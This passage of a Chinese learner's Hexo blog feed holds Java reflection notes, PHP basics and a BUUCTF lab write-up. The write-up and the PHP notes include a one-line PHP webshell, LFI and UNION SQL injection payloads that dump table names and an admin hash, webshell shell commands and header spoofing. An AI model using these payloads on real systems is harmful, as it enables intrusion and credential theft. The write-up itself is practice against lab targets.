null</li></ul><p>反射操作方法</p><ul><li>获取方法<ul><li>getMethod</li></ul></li></ul><h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><p>java . lang . reflect .Filed 类</p><ul><li>getModifiers ：以 int 形式返回修饰符</li><li>getType：以 Class 形式返回类型</li><li>getName：返回属性名</li></ul><p>java . lang . reflect . Method 类</p><ul><li>getModifiers ：以 int 形式返回修饰符</li><li>getReturnType：以 Class 形式获取返回类型</li><li>getName：返回方法名</li><li>getParameterTypes：以 Class [ ] 返回参数类型数组</li></ul><p>java . lang . reflect . Constructor 类</p><ul><li>getModifiers ：以 int 形式返回修饰符</li><li>getName：返回构造器名（全类名）</li><li>getParameterTypes：以 Class [ ] 返回参数类型数组</li><li>newInstance</li></ul><p>差不多就到这了，笔记比较简洁，里面有很多比较简单的东西没写，可能因为篇幅太长了，传上来的时候老是出现奇奇怪怪的问题，大半夜的差点给我干破防 qwq，搞了好半天才弄好呜呜呜呜呜……</p><p><img src="/2024/11/06/TestWP/q.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java 基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP 基础(部分)</title>
    <link href="/2024/11/08/PHP%E5%9F%BA%E7%A1%80-%E9%83%A8%E5%88%86/"/>
    <url>/2024/11/08/PHP%E5%9F%BA%E7%A1%80-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p>关于 PHP 的一小部分知识</p><span id="more"></span><h1 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h1><p>如 <code>__FILE__</code> 这样的预定义常量，被称为魔术常量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">__FILE__</span><span class="hljs-comment">// 返回文件完整的路径和文件名</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">//代码高亮显示当前文件内容</span><br><span class="hljs-keyword">__LINE__</span><span class="hljs-comment">// 表示当前行号</span><br><span class="hljs-keyword">__FILE__</span><span class="hljs-comment">// 表示当前文件名</span><br><span class="hljs-keyword">__DIR__</span><span class="hljs-comment">// 表示当前文件所在的目录</span><br><span class="hljs-keyword">__FUNCTION__</span><span class="hljs-comment">// 表示当前函数名</span><br><span class="hljs-keyword">__CLASS__</span><span class="hljs-comment">// 表示当前类名</span><br><span class="hljs-keyword">__METHOD__</span><span class="hljs-comment">// 表示当前方法名</span><br><span class="hljs-keyword">__NAMESPACE__</span><span class="hljs-comment">// 表示当前命名空间</span><br></code></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">include</span>(): 包含并运行指定文件，包含文件发生错误，程序警告，但会继续执行<br><span class="hljs-built_in">include_once</span>(): 检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次<br><span class="hljs-built_in">require</span>(): 包含并运行指定的文件，包含文件发生错误时，程序直接终止执行<br><span class="hljs-built_in">require_once</span>():和 require 类似，不同处在于 require_once 只导入一次<br><span class="hljs-built_in">fopen</span>(): 打开一个文件或 URL<br><span class="hljs-built_in">file_get_contents</span>(): 读取文件的全部内容到一个字符串，例如 <span class="hljs-variable">$content</span> = <span class="hljs-built_in">file_get_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>);<br><span class="hljs-built_in">file_put_contents</span>(): 将一个字符串写入文件。例如：<span class="hljs-built_in">file_put_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;Hello butt3rf1y!&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">eval</span>(): 将字符串当中php代码来执行，比如: 一句话木马@<span class="hljs-built_in">eval</span>(_POST[<span class="hljs-string">&quot;1&quot;</span>]);<br><span class="hljs-built_in">assert</span>(): 检测执行条件是否为 true<br></code></pre></td></tr></table></figure><p>调用系统底层的4个方法-system , shell_exec , exec , passthru</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">system</span>(): 调用系统底层，执行系统命令，例如 <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls /&quot;</span>); 列出当前目录下所有文件<br><span class="hljs-built_in">shell_exc</span>(): 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回<br><span class="hljs-built_in">exec</span>():执行一个外部程序<br><span class="hljs-built_in">passthru</span>():执行外部程序并且显示原始输出，当所执行的 Unix<br>命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 <span class="hljs-built_in">exec</span>() 或 <span class="hljs-built_in">system</span>() 函数<br></code></pre></td></tr></table></figure><h2 id="反序列化函数"><a href="#反序列化函数" class="headerlink" title="反序列化函数"></a>反序列化函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">unserialize</span>(): 将一个已序列化的字符串转换回 PHP 的值。例如：<span class="hljs-variable">$array</span> = <span class="hljs-built_in">unserialize</span>(<span class="hljs-variable">$serializedStr</span>); 可以将一个序列化的数组字符串转换为数组。<br></code></pre></td></tr></table></figure><h2 id="数据库操作函数"><a href="#数据库操作函数" class="headerlink" title="数据库操作函数"></a>数据库操作函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">mysql_query</span>(), <span class="hljs-built_in">mysqli_query</span>(): 发送一个 MySQL 查询。例如：<span class="hljs-variable">$result</span> = <span class="hljs-built_in">mysql_query</span>(<span class="hljs-string">&quot;SELECT * FROM users&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="正则表达式函数"><a href="#正则表达式函数" class="headerlink" title="正则表达式函数"></a>正则表达式函数</h2><p><strong>preg_match():</strong></p><p>用于进行正则表达式匹配，成功返回 1，否则返回 0。</p><p>注: <code>preg_match() </code>第一次匹配成功后就会停止匹配，如果要实现全部结果的匹配，即搜索到检索对象的结尾处，则需使用 <code>preg_match_all()</code> 函数。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>, <span class="hljs-string">&quot;PHP is the web scripting language of choice.&quot;</span>, <span class="hljs-variable">$matches</span>))<br>   &#123;<br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;A match was found:&quot;</span>. <span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>]; <br>   &#125; <br>   <span class="hljs-keyword">else</span><br>   &#123;<br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;A match was not found.&quot;</span>; <br>   &#125; <br><span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">//A match was found: PHP </span><br></code></pre></td></tr></table></figure><p><strong>preg_match_all():</strong> </p><p>用于进行正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>   <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;&lt;pre&gt;学习php是一件快乐的事。&lt;/pre&gt;&lt;pre&gt;所有的 phper 需要共同努力！&lt;/pre&gt;&quot;</span>; <br>   <span class="hljs-variable">$kw</span> = <span class="hljs-string">&quot;php&quot;</span>; <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/&lt;pre&gt;([sS]*?)&lt;/pre&gt;/&#x27;</span>,<span class="hljs-variable">$str</span>,<span class="hljs-variable">$mat</span>); <br>   <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>]);<span class="hljs-variable">$i</span>++)<br>   &#123;<br>      <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$mat</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$i</span>]; <br>      <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$kw</span>, <span class="hljs-string">&#x27;&lt;span style=&quot;color:#ff0000&quot;&gt;&#x27;</span>.<span class="hljs-variable">$kw</span>.<span class="hljs-string">&#x27;&lt;/span&gt;&#x27;</span>, <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>]); <br>      <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$mat</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$i</span>], <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>], <span class="hljs-variable">$str</span>); <br>   &#125; <br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>; <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//将所有 &lt;pre&gt;&lt;/pre&gt; 标签内的关键字显示为红色</span><br></code></pre></td></tr></table></figure><p><strong>preg_match_all()</strong></p><p>用于进行正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE 。</p><p><strong>preg_replace()</strong></p><p> 执行正则表达式搜索和替换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;butt3rf1y&quot;</span>;<br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/\d+/&#x27;</span>;<span class="hljs-comment">// \d+是匹配一个或多个数字</span><br><span class="hljs-variable">$replacement</span> = <span class="hljs-string">&#x27;R&#x27;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>; <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// buttRrfRy</span><br></code></pre></td></tr></table></figure><p><strong>preg_split()</strong></p><p>将字符串依指定的规则切开。</p><h1 id="表单数据"><a href="#表单数据" class="headerlink" title="表单数据"></a>表单数据</h1><p><strong>$_GET</strong></p><p>接受 GET 请求传递的参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">example.com/index.php?<span class="hljs-attribute">bu</span>=butt3rf1y，你可以使用 <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bu&#x27;</span>] 来获取相应的值<br></code></pre></td></tr></table></figure><p><strong>$_POST</strong></p><p>接受 POST 传参</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">example.com/index.php 进行 POST 传参，参数名为 bu 内容为 but3rf1y，可以使用 <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bu&#x27;</span>] 来获取相应的值。<br></code></pre></td></tr></table></figure><p><strong>$_REQUEST</strong></p><p>接受 GET 和 POST 以及 Cookie 请求传递的参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">通过 <span class="hljs-built_in">GET</span> 请求 URL 传递了一个参数 example.com/index.php?<span class="hljs-attribute">key</span>=value_from_get，可以通过 <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] 获取这个值。<br>通过 POST 方法提交了一个表单，其中有一个名为 key 的字段且其值为 value_from_post，可以通过 <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] 获取这个值。<br>设置了一个名为 key 的 cookie，其值为 value_from_cookie,可以使用 <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] 来获取这个值。<br></code></pre></td></tr></table></figure><p>有点小累……</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU Basic(1)</title>
    <link href="/2024/11/07/BUUBasic-1/"/>
    <url>/2024/11/07/BUUBasic-1/</url>
    
    <content type="html"><![CDATA[<p>BUU 做的几道题</p><span id="more"></span><h2 id="BUU-LFI-COURSE-1"><a href="#BUU-LFI-COURSE-1" class="headerlink" title="BUU LFI COURSE 1"></a>BUU LFI COURSE 1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>构造 payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">file</span>=/flag<br></code></pre></td></tr></table></figure><h2 id="BUU-SQL-COURSE-1"><a href="#BUU-SQL-COURSE-1" class="headerlink" title="BUU SQL COURSE 1"></a>BUU SQL COURSE 1</h2><p><img src="/2024/11/06/TestWP/c-1/SQL1.png"></p><p>点击 <code>测试新闻1</code> ，f12 查看状态，发现注入点，访问请求网址</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 正常回显<br><span class="hljs-attribute">1</span>=2 报错，说明有注入点<br></code></pre></td></tr></table></figure><p>构造 payload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata),<span class="hljs-number">2</span>#<br>得到数据库：information_schema,performance_schema,ctftraining,mysql,test,news<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;news&#x27;</span>),<span class="hljs-number">2</span>#<br>得到数据库 news 下的表：<span class="hljs-keyword">admin</span>,contents<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctftraining&#x27;</span>),<span class="hljs-number">2</span>#<br>得到数据库 ctftraining 下的表：FLAG_TABLE,news,users<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;admin&#x27;</span>),<span class="hljs-number">2</span>#<br>得到 <span class="hljs-keyword">admin</span> 表下的列名：id,username,<span class="hljs-keyword">password</span><br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">2</span>#<br>得到 users 表下的列名：<span class="hljs-keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,<span class="hljs-keyword">password</span>,ip,<span class="hljs-type">time</span><br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(username,&quot; &quot;,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>),<span class="hljs-number">2</span>#<br>得到 <span class="hljs-keyword">admin</span> 的数据：username=<span class="hljs-keyword">admin</span> <span class="hljs-keyword">password</span>=<span class="hljs-number">64</span>ebd6a0d676acff2c6bed36e716c9aa<br></code></pre></td></tr></table></figure><h2 id="BUU-UPLOAD-COURSE-1"><a href="#BUU-UPLOAD-COURSE-1" class="headerlink" title="BUU UPLOAD COURSE 1"></a>BUU UPLOAD COURSE 1</h2><p>文件上传，先上传一个一句话木马 11.php ，但是蚁剑连接不了，无论上传什么都会被解析成 <code>.jpg</code> 格式</p><p>后面才知道这有一个文件包含漏洞，文件上传和文件包含结合起来了。</p><p><code>http://4eb012d0-f5b1-4297-907d-54f47dfaddf1.node5.buuoj.cn:81/index.php?file=upload.php</code> 将 <code>upload.php</code> 换成上传的文件的路径，然后对其 post 传参 </p><p>payload：1 是一句话木马的连接密码</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">1</span>=system(<span class="hljs-string">&quot;ls /&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">1</span>=system(<span class="hljs-string">&quot;cat /flag&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="BUU-BURP-COURSE-1"><a href="#BUU-BURP-COURSE-1" class="headerlink" title="BUU BURP COURSE 1"></a>BUU BURP COURSE 1</h2><p>提示只能本地访问，所以bp 抓包进行 <code>X-Forwarded-For</code> 伪造</p><p>然后进行 post 传参</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=admin&amp;password=wwoj2wio2jw93ey43eiuwdjnewkndjlwe<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>BUUCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TestWP</title>
    <link href="/2024/11/06/TestWP/"/>
    <url>/2024/11/06/TestWP/</url>
    
    <content type="html"><![CDATA[<p>这是一篇测试文章</p><span id="more"></span><p><img src="/2024/11/06/TestWP/111.png"></p><h1 id="一剪梅·红藕香残玉簟秋"><a href="#一剪梅·红藕香残玉簟秋" class="headerlink" title="一剪梅·红藕香残玉簟秋"></a>一剪梅·红藕香残玉簟秋</h1><p>一剪梅·红藕香残玉簟秋</p><p>李清照</p><p>红藕香残玉簟秋。轻解罗裳，独上兰舟。云中谁寄锦书来？雁字回时，月满西楼。<br>花自飘零水自流。一种相思，两处闲愁。此情无计可消除，才下眉头，却上心头。</p><p>C&#x2F;C++</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>Python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;e3nifIH9b_C@n@dH&quot;</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)):<br>    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i])-i)<br><span class="hljs-built_in">print</span>(base64.b64decode(flag))<br></code></pre></td></tr></table></figure><p>Java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Node java= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;java&quot;</span>);<br>        Node rw=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;rw&quot;</span>);<br>        Node urm=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;urm&quot;</span>);<br>        java.next=rw;<br>        rw.next=urm;<br>        <br>        urm.prev=rw;<br>        rw.prev=java;<br>        <br>        Node first=java;<br>        Node last=urm;<br>        <br>        Node temp=first;<br>        <span class="hljs-keyword">while</span>(temp!=<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(temp);<br>            temp=temp.next;<br>        &#125;<br>        <br>        temp=last;<br>        <span class="hljs-keyword">while</span>(temp!=<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(temp);<br>            temp=temp.prev;<br>        &#125;<br>        <br>    &#125;<br>    <br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span>&#123;<br>    <span class="hljs-keyword">public</span> Node prev;<br>    <span class="hljs-keyword">public</span> Node next;<br>    <span class="hljs-keyword">public</span> Object item;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Node</span><span class="hljs-params">(Object item)</span> &#123;<br>        <span class="hljs-built_in">this</span>.item = item;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Node&#123;&quot;</span> + <span class="hljs-string">&quot;item=&quot;</span> + item + <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>表格</p><table><thead><tr><th>1</th><th>2</th><th>3</th></tr></thead><tbody><tr><td>4</td><td>5</td><td>6</td></tr><tr><td>7</td><td>8</td><td>9</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Other</category>
      
    </categories>
    
    
    <tags>
      
      <tag>other</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/11/06/hello-world/"/>
    <url>/2024/11/06/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" 